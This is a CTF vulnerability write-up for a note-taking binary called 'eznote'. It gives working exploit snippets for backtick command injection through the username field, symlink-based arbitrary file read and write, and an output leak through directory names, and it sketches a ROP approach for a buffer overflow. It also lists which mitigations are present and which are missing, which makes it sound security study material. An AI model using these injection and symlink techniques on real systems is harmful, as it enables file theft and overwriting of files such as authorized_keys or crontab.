# eznote Vulnerability Analysis

## Vulnerability 1: Command Injection (Primary)
**Location:** `create_note_dir()` function
**Root Cause:** Username field allows backticks `` ` `` for command injection
- USERNAME_BLACKLIST only blocks: `"` `'` `.`
- Backticks and `$()` are NOT blocked
- `mkdir -p "%s/%s/"` runs via `system()` with user-controlled username
- Option 2 (create note dir) does NOT enable seccomp sandbox

**Exploit:**
```python
username = b'a`cp /flag /tmp/exfil`'
# Call option 2 -> executes: mkdir -p "PATH/a<cmd_output>/"
```

---

## Vulnerability 2: Symlink Attack (Chained with #1)
**Location:** `show_note()` function reads arbitrary files via symlink
**Chain:**
1. Use command injection to create symlink: `ln -sf /flag /tmp/PID/*/user/notename`
2. Call `show_note()` which reads the symlink target

**Key Insight:** Seccomp sandbox allows `read`, `open`, `fgetc`, `putchar` syscalls

**Exploit:**
```python
# Step 1: Create note dir
username = b'test'
option(2)

# Step 2: Inject symlink command  
username = b'x`for d in /tmp/$PPID/*/test;do ln -sf /flag $d/aa;done`'
option(2)

# Step 3: Read symlinked flag
username = b'test'
option(4)  # show_note('aa') -> reads /flag
```

---

## Vulnerability 3: Buffer Overflow in Note Name (Potential ROP)
**Location:** `main()` function when reading note name for options 3/4
**Details:**
- Buffer: 80 bytes at `rbp-0x50`
- Read: 96 bytes via `read(0, buf, 0x60)`
- Overflow: 16 bytes past buffer boundary

**Constraints:**
- Stack canary at `rbp-0x8` (8 bytes)
- Note name validation only allows hex chars (0-9, a-f)
- Seccomp blocks `execve`/`execveat`

**Potential Exploit (if canary can be leaked):**
- Use ROP chain with `open("/flag")` -> `read(fd, buf)` -> `write(1, buf)`
- All these syscalls are allowed by seccomp

---

## Vulnerability 4: Information Leak via Directory Names
**Location:** Command injection output appears in created directory name
**Use Case:** When direct output capture isn't possible

**Example:**
```python
username = b'a`cat /flag`'
option(2)
# Creates directory: /tmp/PID/RANDOM/ahkcert24{flag_content}/
# Flag visible in directory listing
```

---

## Vulnerability 5: Arbitrary File Write via Symlink
**Location:** `create_note()` function writes through symlinks
**Chain:**
1. Use command injection to create symlink pointing to target file
2. Call `create_note()` which opens and writes through the symlink

**Key Insight:** 
- `fopen(path, "wb")` follows symlinks
- Note name must be valid hex (0-9, a-f)
- Seccomp sandbox allows `fopen`, `fputc`, `fclose`

**Exploit:**
```python
# Step 1: Create user dir
username = b'test'
option(2)

# Step 2: Create symlink via command injection
symlink_cmd = f'x`ln -sf /target/file /tmp/PID/RANDOM/test/aa`'
username = symlink_cmd
option(2)

# Step 3: Write through symlink
username = b'test'
option(3)  # create_note
notename = 'aa'  # valid hex
content = b'malicious content'
# -> Writes to /target/file
```

**Impact:** Arbitrary file overwrite (e.g., crontab, authorized_keys, web shells)

---

## Exploit Scripts

1. `eznote_exploit.py` - Command injection with stderr output capture
2. `eznote_exploit_filewrite.py` - Symlink attack for arbitrary file read/write  
3. `eznote_exploit_dirleak.py` - Directory name leak for flag exfiltration

## Security Mitigations Present
- Stack canary (partial protection for buffer overflow)
- Seccomp filter (blocks execve/execveat)
- Note name validation (hex chars only)
- Username blacklist (blocks `"`, `'`, `.`)

## Missing Mitigations
- Backticks/`$()` not in username blacklist
- No path validation for symlinks
- Sandbox not applied to `create_note_dir`
- fopen() follows symlinks without checking
